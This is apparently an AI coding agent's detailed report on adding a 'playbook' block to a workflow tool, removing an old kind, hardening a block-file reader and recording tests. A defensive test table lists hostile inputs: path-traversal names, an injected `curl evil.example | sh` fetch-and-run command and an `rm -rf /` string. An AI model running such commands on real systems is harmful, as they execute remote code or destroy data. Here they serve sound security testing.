# M3 group P report: the `playbook` block (Task 10) and the removal of `use` (Task 11)

Worktree D:/coding/reins-wt-fork, branch feat/fork-playbook, HEAD 058a0f0, with groups F and E working in the same tree. Nothing committed, added, stashed, reset, checked out (`git restore` included), cleaned or pushed. Read-only git only (`status`, `diff`, `ls-files`, `show`, `archive` into a scratch folder that is removed).

## Result in one screen

- `playbook` is a bundled pack mod: `packages/server/src/mods/playbook/` (`index.ts` + `mod.json`, CRLF like its siblings). **Manifest `order` is 140** (after fork's 135), **view `order` is 150**. Ops `PLAYBOOK`, `PLAYBOOK_END`; events `playbook_started`, `playbook_done`; attributes `input`, `output`, `session`, `usd` (and `playbook`, the heading key, which the loader requires in `provides.attrs`).
- Inline playbooks are compiled into the same program (ids `<step>/<id>`, `against` and links rewritten, `{{name}}` filled into prompts, attribute values, card texts AND conditions BEFORE anything is compiled). `session: own` runs the file as a track with its own session and its own `usd:` slice. Trust reads the compiled program, so every playbook command, with the inputs filled in, is in the trusted list, and the hash changes with an input (tested, and 3 mutations prove it).
- `use` is gone (kind, view, registration, export, comments, README lines, examples, tests). A file that still says `## use X` gets `Unknown step kind "use"` from the parser and from the validator (one error each).
- **Goldens: 3 of the 4 re-recorded under the normalized-diff rule (`a-examples`, `a-hand`, `b-diags`), each with an empty normalized diff (b-diags: exactly the one entry the plan allows). `golden-m1/runs-S9.json` is NOT recorded: its normalized diff is not empty (one number, see below). Its test stays RED, listed for you. A FIFTH golden the plan missed, `golden-m2/contract-examples.json`, has an empty normalized diff but is not one of the four, so I did not record it either; its test (`m2-contract`) stays RED too.** Both candidate files are in `spike/tmp/p-candidates/` (gitignored).
- New golden `golden-m2/runs-pb-end.json` recorded once (`REINS_RECORD_M2=1`), after the explicit assertions of the test passed.
- Gate (all run by me, `--maxWorkers=1`): core 73 files, 992 tests, **990 green, 2 red (S9 and contract-examples, on purpose)**; app 57 files, 895 green; server (139 files, in 12 batches because one big run dies with `ERR_IPC_CHANNEL_CLOSED` on this busy box) 3413 green, 7 skipped, 0 red (excluding `*.browser.test.ts`, `*.real.test.ts`, `test/live`, which I did not run); root `tsc --noEmit` and `tsc -p packages/app` clean; eslint clean on every file I touched; core and server build (`npm run build` in `packages/server`: tsc, copy-mods, `doctor --no-probe` lists `playbook` as bundled ok; `dist/mods/playbook` holds `index.js` + `mod.json` only).

## Task 10: what I built

### The mod
- Heading `## playbook <file>` owns `playbook`; sets `step.title` and `step.attrs.playbook` (as `use` did). Print is `playbook <file>`. The spec 5.1 example parses, prints back the same bytes and validates clean (test).
- Validation words (all from the v3 table, exact): `Playbook "x" not found`, `` `session:` must be `own`, or left out for the same session (step `x`) ``, `` `usd:` on playbook `x` needs `session: own` ``, `` `input:` of `x` must be name = value pairs separated by ; ``, `` playbook `x` gives no input `name`, which `file` uses ``, `` input `name` of playbook `x` is not used by `file` `` (warning), `` `file` has no step `findings` ``, `` playbook `x` runs `file`, which runs itself ``, `` `file` line <n>: <message> `` (the file's own error), the F10 words for a `model` block in an own playbook.
- New words of mine (not in the table): `Playbook "x": its name must be one plain file name (letters, digits, - _ and . only), not a path`; `Playbook "x": the file is larger than 100 KB` / `it is not a file` / `the file is a link to somewhere outside the blocks folder` / `the file is not a workflow: ...`; `` input `n` of `x` is given twice in `x` ``; `` input `n` of `x` has a hidden character (<U+202E>); it is not used ``; `` `input:` of `x` has too much in it (at most 30 inputs, each at most 300 characters) ``; `` playbook `x` is nested more than 8 levels deep ``; `` `output:` of playbook `x` does nothing without `session: own`: ... `` (warning); `a playbook sends no turn; its cards and prompt do nothing` (warning); `` playbook `x` holds a block that runs branches at the same time; put that block in the main stack, outside the playbook ``; `` playbook `x` puts in more than 2000 steps or 2 million characters `` (a compile fault that validate reports as "instruction N could not be compiled: ...").
- Run: inline `PLAYBOOK` (counter moves, then `playbook_started`), the steps, `PLAYBOOK_END` (`playbook_done`). Own: `PLAYBOOK` starts ONE track (key = step id, title `Playbook <name>`, `usd`), parks; when the track ended it hands back each declared `output:` quoted as data (`Output "<name>" of <title> (step <step>/<name>), quoted as data; ...`), or the last reply (`Result of <title> (step <key>). ...`), or `<name> did not run.`, then `vm.goto(after)` (NOT `vm.next()`, see "plan errors"), then `playbook_done`. The quote helper (fence one longer than any backtick run, last 8000 characters, `[the first <n> characters were cut]`) is the fork's, written again here (a pack mod imports nothing outside its folder).
- `count`: `playbook_started` to `playbooks` (receipt `counts.playbooks`). `print`: `· playbook <step>: <name> started` / `finished`. View rows for the same two events.

### Core and host changes (read these, they are outside the mod)
1. `CompileCtx.endsOf(body)` and `CompileCtx.endsTo(ends, to)` (`nodes/index.ts`, `compile.ts`). The plan said "each inner END rewritten to JUMP through `ctx.get(i)`", but a mod's `ctx.get` returns a frozen copy (M2 Task 16c), so a mod cannot rewrite. `endsOf` returns the indices of the ENDs that `body` pushed through `push` (a nested `endsOf` keeps its own, so an own playbook's track-ending ENDs are never claimed by an enclosing inline playbook); `endsTo` turns only ENDs at or after the start of the step being compiled into `JUMP to`. Tested directly with a toy kind, and the "own playbook inside an inline one" test failed on the first try and caught a real bug in my first version (the closing END of an own playbook was claimed by the outer inline playbook).
2. `TrackSpec.usd` (spec 3.4 had it, the code did not). In `run.ts`: a track started with `usd` gets `openSlice = {step: key, usd: min(usd, the starter's share left)}`, `ownSlice: true` (new `Track` field, saved in the snapshot and checked on restore), its spend counted under the track's key (reset at start, dropped at end), the engine session gets `maxUsd`/`usdRoom` from the slice (`sliceCap`, only for `ownSlice` tracks, so every other track is untouched), and `countCost` adds a track's cost to every track above it (an own playbook inside a branch spends the branch's share). Hitting the cap pauses the run on the USD card at the playbook step; Allow more lifts it (tested). The first heuristic ("the slice's step equals the track key") broke 3 existing tests (a `model` step that starts a track opens a slice with the same name), hence the explicit flag.
3. `Workflow.problems?` (`model.ts`) and `checkBlock` (`validate.ts`) prepend them: the host that reads a block file attaches what the PARSER said about it (`Unknown attribute "bogus"` is a parse diagnostic that `validate()` alone never sees). Only the block resolver sets it.
4. `validate.ts`: the generic "starts twice" check (`` `x` would appear twice once the playbooks are put in; give one of the steps another id ``), in the clean-program stage, from `compileProgram(w, resolveBlock, starts)`; names no kind. A workflow with no playbook gets no new diagnostic (pinned at HEAD, see below).
5. `run-cli.ts` `readBlock` (the one block file reader of `reins check`, `run`, the app): a plain file name only (`/^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$/`, and not a Windows device name like `CON`), the real path must be a file directly inside the real `blocks/` folder (a link out is refused), at most 100,000 bytes, text that is not a workflow is refused (it used to be read as nothing), parser problems attached. It THROWS the reason; the playbook shows it as an error on the step. **At HEAD `## use ../secret` read `secret.reins.md` from outside `blocks/` with no diagnostic and put its steps in the program (shown by a scratch run at HEAD: `HEAD diagnostics: []  program has LEAKED: true`).**
6. Loader rule met on the way: `provides.attrs` must list the heading key (`playbook`).
7. Not a change, but a trap: the core project's setup registers pack mods WITHOUT the guard (no `mod` mark), so a compile that throws is not turned into a fault there. Tests about hostile compiles therefore run in the server project, through the real loader.

### Hostile playbook files (be hostile: what happens, each with a test)
| Attack | Result |
|---|---|
| `## playbook ../secret`, `..\secret`, `a/b`, `/etc/passwd`, `C:\x`, `C:x`, `.hidden`, `CON`, `nul`, `com1.txt`, 101 characters, spaces, NUL, newline, `~/x`, `$HOME`, `%TEMP%` | `resolveBlock` throws; check says `Playbook "<name>": its name must be one plain file name ...`; nothing of the outside file is in the program |
| a hidden character in the name | the message shows `<U+202E>` |
| file over 100 KB; a folder named `x.reins.md`; a link to a file outside `blocks/` (symlinks work on this machine, so the test runs); junk text | each refused in words |
| a parse problem in the file (`bogus: 1`), also with a hidden character | shown on the playbook step: `` `odd` line 7: Unknown attribute "bo<U+202E>gus" `` |
| a file that runs itself; two files that run each other; a chain of 12 files | cycle words; stops at 8 levels with words |
| a file that fans out (60 playbooks of a 60-step file) | compile fault, reported by validate (`could not be compiled: ... more than 2000 steps`), in well under 10 s |
| 20,000 nested `not `s in a condition; 300 nested headings | `Playbook "deep": Maximum call stack size exceeded`; no throw out of check or run; the workflow is not returned (not trusted, not run) |
| `{{__proto__}}`, `{{constructor}}`, `{{toString}}` in the file | "gives no input" errors (inputs live in a `Map`; nothing on `Object.prototype` is read or written) |
| an input NAMED `__proto__` | refused (`name = value pairs` words) |
| hidden characters, a control character, a line break in an input value | refused with the code point; the playbook compiles to a fault, so it adds no command |
| a value that looks like `{{other}}` | stays text (one pass; tested, and a mutation that fills twice is caught) |
| an input that injects a second command (`a.ts && curl evil.example | sh`) | by spec 5.2 it is inserted as it is; it appears WHOLE inside the one command in the trust list and the hash changes (tested). `;` ends an input, so `a.ts; rm -rf /` is a malformed second pair and an error. **Not built: a warning for shell characters in a value used in a command.** Say if you want one |
| a fork (or any block that runs branches) inside a playbook | own: new error above (a fork's own `program` check never sees a playbook's steps, because the hook runs only for the parsed steps of the calling file; I found that by running it); inline: the existing region errors (`leads back into the stack ...`, `put an end under each branch`) |

### Things I checked the plan did not ask
- Snapshot while an own playbook's track works restores and finishes; the playbook is not started twice; the slice is still the track's own.
- A playbook inside a `repeat` runs once per pass. An inline playbook inside a branch: its steps are branch members and run on the branch's session. An own playbook inside an own playbook: two sessions, the outer gets the inner's output. An own playbook inside a branch: cap `min(usd, share left)` and its cost counts toward the branch (the receipt total is not counted twice).
- The built CLI (`node packages/server/dist/cli.js check`) on a real folder: the bad path, the missing input, the cycle and `## use` give the words above, with `file:line:col`; a good file shows the playbook file's own warning with its line.

## Task 11: `use` removed

- Deleted: `core/src/nodes/use.ts`, `use.view.ts`, the import, the registration (`[[use, 80]]`), the `useNode` export in `nodes/index.ts`; `views.ts` `BUILTIN_VIEWS` is now `[]` (core holds no view of its own). Registry order list no longer has `use` (kind-order, m2-pins, Q14 golden, the four pin expected files, kinds-route).
- Greps re-run (`rg` patterns of the plan over `packages/*/src`, `packages/*/test`, goldens). The plan said "stop if they find more than listed". They found more than listed, all consequences of the M3 moves, none a surprise in meaning: `views.ts`/`BUILTIN_VIEWS`, `nodes/README.md` lines 100 and 102 (not 108), `mods/README.md` (`{attrs.use}` example, "10 to 130"), `README.md` line 55, `mods/end/index.ts` (the `end` comment moved with the pack), `m2-pins.test.ts:292` (a second S9 run), app `viewData.test.ts` ('use sub', 'use has none'), `kinds-route.test.ts`, the four `m3-task-*-pin.expected.json`, and the fifth golden. I went on because each one is the word `use` as a kind, not new behaviour.
- Examples: `tdd-loop` and `upload-retry` say `## playbook review-pass`; `examples/blocks/review-pass.reins.md` unchanged (keeps `block: review-pass`).
- Comments changed: `compile.ts` (2), `validate.ts`, `rename.ts`, `feed.ts`, `TextTab.tsx`, `mods/end/index.ts`. CHANGELOG: the Playbook paragraph and the `use` removal line (the plan's exact words). README row of steps.
- New `it` in `removed-kinds.test.ts`: `## use review-pass` gives `error: Unknown step kind "use"` from the parser and one from validate; compile gives `TURN, END`; nothing throws.
- **`use` Stop and free-phase quirks:** nothing depended on them. `use` compiled its steps into the main program and had no op, so Stop never saw it. S9's free phase "never runs" is not an effect of the block (nothing links to it); the rewritten S9 still runs the three inner steps, the top-level `end` ends the run and the free phase does not run (the normalized comparison above shows the same turns, texts and receipt; the new `runs-pb-end` test pins the new behaviour, an inner `end` ends only the playbook, with explicit asserts before its golden is compared). The two pinned M1 bugs of spec section 8 (a saved run restored at a subagent's result; a queued `now` card for a subagent) do not touch `use` or playbook. The stop-holds, stop-await and S11 pins are green.

### Goldens and the normalized diffs
The normalizer (`spike/tmp/normalize.mjs`, gitignored, not committed): take the NEW file; (1) delete the instructions `PLAYBOOK` and `PLAYBOOK_END` from every program and renumber `target`, `onFailJump`, `onPassJump`, `loopExit`, `elseJump` as if they were absent; (2) delete the events `playbook_started` and `playbook_done` and `counts.playbooks`; (3) write back kind `playbook` as `use`, `attrs.playbook` as `attrs.use`, step id `playbook-<n>` as `use-<n>`, id prefix `playbook-<n>/` as `<file>/`; (4) in `a-hand.json` only, `against: <file>/plan` back to `against: plan`. Then compare with the OLD file (copies in `spike/tmp/old/`, new ones in `spike/tmp/new/`).

| Golden | Normalized diff | Done |
|---|---|---|
| `golden-3a/a-examples.json` | EMPTY (2 instructions deleted from the 13-instruction program of tdd-loop, 2 from the 16 of upload-retry) | recorded (`REINS_RECORD_3A=1`), restored to CRLF as it was |
| `golden-3a/a-hand.json` | EMPTY with rule 4 (entry 6, `## playbook vblock`: 2 instructions deleted from 5; `against: vblock/plan` back to `plan`) | recorded |
| `golden-3a/b-diags.json` | only entry 8 (index 7, `## use nope`) differs, and exactly as the table says. Old: `Block "nope" not found` (1 diagnostic), tree with `"attrs": {"use": "nope"}` and `"title": "nope"`. New: TWO `Unknown step kind "use"` errors (parser and validator, both at 7:1), tree with `"attrs": {}` and no `title`. Every other entry equal | recorded |
| `golden-m1/runs-S9.json` | **NOT EMPTY**: after the four rules the only difference is `receipt.totalTimeMs`: old `14000`, new `16000`. The harness clock adds 1000 per event, and the playbook logs two events the old block did not. With `totalTimeMs` ignored the normalized diff is empty (checked) | **NOT recorded. Test `S9 playbook review-pass, end, a free phase` is RED.** To record: `REINS_RECORD_M1=1 npx vitest run packages/core/test/m1-behaviour.test.ts -t S9`, then keep the file CRLF (candidate with the new 16000 in `spike/tmp/p-candidates/runs-S9.json`, LF) |
| `golden-m2/contract-examples.json` (NOT one of the four) | EMPTY (programs of the examples with `review-pass/` ids) | **NOT recorded. Test `m2-contract` > `programs of every example compile to what they did before` is RED.** To record: `REINS_RECORD_M2=1 npx vitest run packages/core/test/m2-contract.test.ts` (it is an LF file; candidate in `spike/tmp/p-candidates/`) |

Recording side effect handled: `REINS_RECORD_3A` also rewrites `a-trees`, `b-else`, `c-conds`, `e-phase-cmd` (the writer is LF, the files are CRLF). Their content did not change (git shows no content diff); I wrote them back to CRLF, so `git status` does not list them. `git diff --stat -- packages/*/test/golden-*` lists: `a-examples`, `a-hand`, `b-diags` (my three), and `golden-m2/pin-q14-registry.json` (a hand edit: `use` removed, `playbook` added with ops `PLAYBOOK`, `PLAYBOOK_END`; fork's entry is F's). New untracked: `golden-m2/runs-pb-end.json`. Not touched: all other `golden-m1`, `golden-3b`, `server/test/golden-m1/trust.json`.

## Tests

New:
- `core/test/playbook.test.ts` (54): format, every validation word, ids and the starts-twice error, compile shapes (inline, own, own in inline), inputs (all four places, one pass, hostile names, hidden characters, limits, the injected command), runs (inline, S9 as a playbook with the golden, repeat, own with cap/outputs/never-ran/fences/cut/Allow more/restore/own in own/in a branch inline and own, USD share), the helper test for `endsOf`/`endsTo`, the "branches inside a playbook" rule. Fixtures: `core/test/fixtures/blocks/{review-pass,pb-end,checks}.reins.md`.
- `server/test/m3-task-p-playbook.test.ts` (16): the real loader and the real file reader (all the hostile rows above) and `reins run` printing the playbook lines for an inline and an own playbook.
- `server/test/trust.test.ts`: one new `it` (commands in program order with inputs filled in, hash follows an input, injected command shown whole, a hidden-character input adds no command) and the `use rp` test now says `playbook rp`.
- `server/test/m3-task-p-pin.test.ts` + `m3-task-p-pin.expected.json`: THE PIN, recorded at HEAD before any code (`PIN_WRITE=1`): for seven workflows without a playbook (bug-fix, safe-refactor, slash ids, duplicate id, bad links, loops, a block file) the parse diagnostics, the printed text, validate, the full compiled program and `loadWorkflowText` diagnostics. Green at HEAD and green now: the starts-twice check, the compile helpers and the file reader add nothing for a workflow without a playbook.
- `removed-kinds.test.ts`: the `## use` `it`.

### Red at HEAD
Exported HEAD with `git archive` to `D:/coding/reins-scratch-p` (node_modules by junction), copied in the new files, ran them; scratch folder and junctions removed (I removed the junctions with `[IO.Directory]::Delete` first, and checked the real `node_modules` was intact):
- `playbook.test.ts`: 49 of 50 red (the one green is "a workflow with no playbook gets no such diagnostic", which pins unchanged behaviour on purpose).
- `m3-task-p-playbook.test.ts`: 16 of 16 red. `trust.test.ts`: 2 of 9 red. `removed-kinds.test.ts`: 1 of 9 red.
- `m3-task-p-pin.test.ts`: green at HEAD (it is the pin).
- The path attack: a scratch test at HEAD showed `## use ../secret` read the outside file (above).

### Mutations (56 hand breaks, each one string swapped in, the named files run, the original bytes written back and compared by SHA-256: `restored=true` every time; no git command)
| Rule | Breaks (first red test) |
|---|---|
| fill before compile and trust (7) | F1 no fill at all (9 red, inline compile), F2 conditions not filled (2: compile + trust), F3 attribute values (5), F4 card texts (1), F5 fill reads what it inserted (1, "one pass"), F6 prompts (13), F7 file checked unfilled (1) |
| prefix (3) | P1 prefix by file name (19: compile, step-started, playbook), P2 `against` not rewritten (2), P3 links not prefixed (1; a survivor until I added the forward-link test) |
| inner end (5) | E1 not rewritten (4), E2 closing END of an own playbook outside `endsOf` (1; the real bug), E3 `endsOf` leaks to outer scopes (2), E4 `endsTo` reaches earlier steps (1; a survivor until I added the helper test), E5 wrong jump target (5) |
| starts twice (4) | S1 check dropped, S2 words changed, S3 warning instead of error, S4 no `starts` map (each 1 red) |
| file reader (8) | H1 name check off (3), H2 device names (1), H3 slash allowed (2), H4 size cap (1), H5 link check (1), H6 not-a-file (1), H7 parser problems not attached (2), H8 not-a-workflow (1) |
| inputs (5) | I1 hidden-character check (2), I2 `_` allowed first so `__proto__` is a name (2), I3 length cap (1), I4 duplicate input (SURVIVED, then killed by a new test), I5 missing inputs never reported (3) |
| bounds (5) | B1 cycle check (2), B2 step budget (1), B3 compile depth bound (2), B4 validate depth and file-count bound (2), B5 `show()` leaves hidden characters in messages (3) |
| usd of a track (6) | U1 no engine cap (2), U2 not held to the starter's share (1), U3 cost not counted up (1), U4 `ownSlice` not saved (1), U5 counter not dropped at end (1), U6 counter not reset at start (**SURVIVED, equivalent**: with U5 in place the key is already gone at the next start, so the reset is a second layer; each layer alone is covered by U5's test and nothing else can reach U6) |
| own playbook (7) | O1 `vm.next()` instead of `goto(after)` (2), O2 `next` of an own PLAYBOOK without `after` (survived; killed by a new "step under an own playbook is reached" test), O3 `starts` removed (1), O4 words of "did not run" (1), O5 `usd` not passed to the track (4), O6 fence always three (survived; killed by the new fence test), O7 `model` allowed in an own playbook (1) |
| branches inside a playbook (3) | S5 rule off, S6 nested own playbooks not allowed (false positive), S7 wrong base track (each red) |
| `use` removed (3) | X1 a `use` kind registered again in the core setup (kind-order and removed-kinds red), X2 `use: 'mine'` back in the app colour table (views red), X3 the heading prints `use` (round trip red) |
Survivors left: U6 (equivalent, above). Mutations touched shared core files for seconds at a time (`compile.ts`, `run.ts`, `validate.ts`): if group F or E saw a stray red in that window, that was me.

## Existing tests and goldens edited, and why

Core: `no-kind-branch` (kind list, STAYS list, two comment/title strings: `use` is gone), `nodes-registry` ("finds the node files" now expects none: every kind is a pack mod), `kind-order`, `m2-pins` (the registry list, and its S9 run `## use` to `## playbook`, keys only so Q8 is unchanged), `registry` (last built-in is now `playbook`), `golden-m2/pin-q14-registry.json` (a hand edit, see above), `removed-kinds` (new `it`), `m1-behaviour` (S9 title and comment), `refactor-3a-proof` (`## use vblock`; `## use nope` stays, it now pins the removal), `compile` (upload-retry program: 9 `PLAYBOOK`, 10 to 12 the steps as `playbook-1/...`, 13 `PLAYBOOK_END`, 14 `STORE`, 15 `END`; the "use inlines" test renamed), `model-node` and `subagent-node` (`## playbook b`, `PLAYBOOK, NODE, PLAYBOOK_END, END`, ids `playbook-1/...`), `step-started` (starts `playbook-1` then `playbook-1/plan` with parent `playbook-1`; the example's `playbook-1/review`), `phase2`, `validate` (Rule 7 with `kind: 'playbook'`, `attrs: {playbook: 'missing-block'}`). `e2e.test.ts` needed no edit: it passes (the example run's ids and receipt do not assert `review-pass/`).
Server: `exit`, `recover`, `session` (`## playbook rp`; no `rp/...` ids in their assertions), `trust` (above), `kinds-route` (order list `fork, playbook`; "a mod view cannot take the place of a built-in kind" depended on `use` being core's last view, rewritten to the registry's refusal for pack kinds, because the "built-in block" check in `kinds-view` now has nothing to protect and is left as dead code; three toy-beep tests find the toy by name, since its view order 140 now sits between fork and playbook), the four `m3-task-{3,4,Z,y}-pin.expected.json` (the served-order list only: `use` out, `playbook` in; hand edit, not a re-record).
App: `blocks` (the two `use` asserts deleted), `canvasKinds` (12 M1 kinds, `slice(0,12)` and `slice(12)`, the `sub` kinds are `['fork', 'playbook']` and `KINDS.playbook.sub` gives the file name, every kind has `fresh`), `views` (`use: 'mine'` and "13" out), `toy-kind` (`indexOf('end')`), `runState` (`## playbook demo`), `viewData` ('use sub' rewritten for the playbook, 'use has none' deleted, `playbook: {}` in the fresh table).
No `*.browser.test.ts`, `vitest.config.ts`, lockfile, `package.json` or tsconfig was touched.

## What the plan or spec got wrong
1. Plan Task 14: "inner END rewritten through `ctx.get(i)`": `ctx.get` is a frozen copy for a mod. Needed `endsOf`/`endsTo`.
2. Spec 5.3: "runs again: take, hand back, `vm.next()`". `next()` goes to `start` (the first step of the playbook) and would run it again; the op must `goto(after)`. (A mutation proves it.)
3. Spec 3.4 lists `TrackSpec.usd`; the code did not have it. Built (run.ts), with the nesting rule of 4.6.
4. Plan Task 20: "all of golden-m2: no `use`". `golden-m2/contract-examples.json` holds the examples' programs and changes. A fifth golden.
5. Plan Task 20's normalizer does not cover `receipt.totalTimeMs`: the fake clock ticks once per event, so two new events move it by 2000. S9 therefore fails the rule by one number. If you accept a clock-tick rule, the S9 diff is empty.
6. Plan Task 20 list is stale after the pack moves (see "greps" above): `end.ts:7` is in the `end` mod, `views.ts`, `m2-pins.test.ts:292`, `viewData.test.ts`, `kinds-route.test.ts`, four pin files.
7. The loader needs the heading key in `provides.attrs`; the v3 plan's `attrs: ['input', 'output', 'session', 'usd']` is not enough.
8. Spec 5.2 says the file's "own error" is reported with its line, but a parse error of the file never reached `validate`; fixed with `Workflow.problems`.
9. The "block resolver" the plan says to keep had no limits at all (a path, a huge file, a link, a device name). Hardened (see attacks above).
10. A kind's `validate.program` hook runs only for the parsed steps of the calling file, so any rule that lives there (F9, F10, F11, W1, W2) never sees a playbook's steps. W1 and W2 still show through the file's own validation; F9 for an own playbook needed my rule above; F10 works from the fork's side (it reads the region members). F11 inside a playbook file cannot cross a branch (the file's steps only see their own), so nothing is lost. Group F should know.

## Notes for group F and group E
- Instruction shapes (F9 or anything else that wants to see a playbook): `PLAYBOOK { step, playbook, session: 'inline' | 'own', after, start?, usd?, outputs? }` (inline: `after` is the index of its `PLAYBOOK_END`; own: `start` is the first step, `after` is the step under the playbook, the closing END is at `after - 1`) and `PLAYBOOK_END { step, playbook }`.
- Shared files I edited with one-string replacements: `compile.ts`, `run.ts`, `validate.ts`, `model.ts`, `nodes/index.ts`, `kind-order`, `m2-pins`, `registry`, `pin-q14-registry.json`, `canvasKinds.test`, `viewData.test`, `kinds-route.test`, the four pin expected files, `TextTab.tsx`, `feed.ts`. F's entries (`fork`) are as F left them; mine sit after theirs.
- E: the resolver now throws for names and files it refuses, and a playbook file is "a workflow with a `block:` header in `blocks/`". An export of a workflow that uses a playbook needs the playbook file too (I did not touch export).

## Not done, not run
- Browser tests, live tests, `*.real.test.ts`: not run. `tsc -p packages/server/tsconfig.dist-check.json` fails on `test-dist/check.ts` lines 3 and 9 (`Cond` and `guard` types against the fresh core dist); it names neither `use` nor `playbook`, and I did not check HEAD for the same failure.
- No docs beyond the listed lines (Task 15 owns the guide): `nodes/README.md` and `mods/README.md` do not describe `endsOf`/`endsTo`, `TrackSpec.usd`, the pack's playbook, or the file reader's limits.
- The `usage` meter does not know a playbook's `usd` slice (`view.slice` is not set; `own` would use the subagent words).
- No warning for shell characters in an input that lands in a command (the trust list shows them).
- `output:` names a step by id; a step that is not a turn (a `run`) is "did not run".

## `git status --short` (my files)

```
 M CHANGELOG.md
 M README.md
 M examples/tdd-loop.reins.md
 M examples/upload-retry.reins.md
 M packages/app/src/TextTab.tsx                      (one comment; F also edits this file)
 M packages/app/src/feed.ts                          (one comment)
 M packages/app/test/blocks.test.ts
 M packages/app/test/canvasKinds.test.ts             (shared with F)
 M packages/app/test/runState.test.ts
 M packages/app/test/toy-kind.test.ts
 M packages/app/test/viewData.test.ts                (shared with F)
 M packages/app/test/views.test.ts
 M packages/core/src/compile.ts
 M packages/core/src/model.ts
 M packages/core/src/nodes/README.md
 M packages/core/src/nodes/index.ts
 D packages/core/src/nodes/use.ts
 D packages/core/src/nodes/use.view.ts
 M packages/core/src/rename.ts
 M packages/core/src/run.ts
 M packages/core/src/validate.ts
 M packages/core/src/views.ts
 M packages/core/test/compile.test.ts
 M packages/core/test/golden-3a/a-examples.json
 M packages/core/test/golden-3a/a-hand.json
 M packages/core/test/golden-3a/b-diags.json
 M packages/core/test/golden-m2/pin-q14-registry.json  (shared with F)
 M packages/core/test/kind-order.test.ts             (shared with F)
 M packages/core/test/m1-behaviour.test.ts
 M packages/core/test/m2-pins.test.ts                (shared with F)
 M packages/core/test/model-node.test.ts
 M packages/core/test/no-kind-branch.test.ts
 M packages/core/test/nodes-registry.test.ts
 M packages/core/test/phase2.test.ts
 M packages/core/test/refactor-3a-proof.test.ts
 M packages/core/test/registry.test.ts               (shared with F)
 M packages/core/test/removed-kinds.test.ts
 M packages/core/test/step-started.test.ts
 M packages/core/test/subagent-node.test.ts
 M packages/core/test/validate.test.ts
 M packages/server/src/mods/README.md
 M packages/server/src/mods/end/index.ts             (one comment)
 M packages/server/src/run-cli.ts
 M packages/server/test/exit.test.ts
 M packages/server/test/kinds-route.test.ts          (shared with F)
 M packages/server/test/m3-task-3-pin.expected.json  (served-order list only)
 M packages/server/test/m3-task-4-pin.expected.json  (same)
 M packages/server/test/m3-task-Z-pin.expected.json  (same)
 M packages/server/test/m3-task-y-pin.expected.json  (same)
 M packages/server/test/recover.test.ts
 M packages/server/test/session.test.ts
 M packages/server/test/trust.test.ts
?? docs/plan/m3-task-P-report.md
?? packages/core/test/fixtures/blocks/
?? packages/core/test/golden-m2/runs-pb-end.json
?? packages/core/test/playbook.test.ts
?? packages/server/src/mods/playbook/
?? packages/server/test/m3-task-p-pin.expected.json
?? packages/server/test/m3-task-p-pin.test.ts
?? packages/server/test/m3-task-p-playbook.test.ts
```

Line endings: every edited file keeps its own (checked by bytes: no file has mixed endings, no BOM). The three goldens I re-recorded are CRLF again, as they were. New mod files are CRLF, new test files, fixtures and goldens LF. No U+2014 in any file I touched or wrote.

## For the demo: how a playbook is written, shared and shown (user-facing)

**Write it.** A playbook is an ordinary workflow file with a `block:` header instead of a budget, kept in the `blocks/` folder next to the workflow that uses it. Its text can hold `{{name}}` holes:

```
---
reins: 1
block: review-pass
---

## phase review
> Review {{target}}, {{depth}} levels deep. List real problems only.

## phase findings
> Write the findings for {{target}}.

## verify
against: findings
```

The workflow uses it as ONE block:

```
## playbook review-pass
input: target = src/upload.ts; depth = 2
output: findings
session: own
usd: 1.00
```

- `input:` fills the holes (name = value; name = value). A hole nobody fills is an error, an input nobody uses is a warning.
- Without `session:` the steps run inline, in the same conversation, as steps of the workflow. An `end` inside the playbook ends only the playbook.
- `session: own` runs it in a conversation of its own (a track), with its own optional `usd:` cap. When it ends, the `output:` steps (or the last reply) go to the next block, quoted as data.
- The file name is a plain name: no path, no folders (`../x` is refused).

**Share it.** Send the one file (`review-pass.reins.md`). The receiver puts it in the `blocks/` folder next to their workflow and writes `## playbook review-pass`. Before the first run, Reins lists every command the playbook will run with the inputs already filled in, and asks again if an input (or the file) changes a command. A stranger's file cannot read other files, run itself in a loop, or hide a command: those are refused with words, or shown in the list.

**See it.** In the editor it is a palette card "playbook" (Flow section); on the canvas it reads `playbook review-pass`, with the session and the USD cap when set; the panel has Playbook file, Inputs, Outputs, Session and Budget. `reins check` shows the playbook file's own problems on the step, with the file's line ("`review-pass` line 12: ..."). While it runs, the feed says `Playbook review-pass started.` and `finished.`; an inline playbook's steps show as `playbook-1/review`, `playbook-1/findings`; an own playbook is a track titled `Playbook review-pass`, with its own cost row in the receipt. In the terminal: `· playbook playbook-1: review-pass started`, and the receipt line `playbooks 1`.

**Demo path (about three minutes):** show the file and the call; `reins check` on a good file (the playbook's own warning, with its line); change `input:` and show the command list change; then the three refusals a stranger would try: `## playbook ../secret`, a missing input, a file that runs itself; then `## use review-pass` and the sentence "use is gone: write playbook". Run it once inline and once with `session: own` and `usd: 0.20` (needs a real engine; I ran neither live).
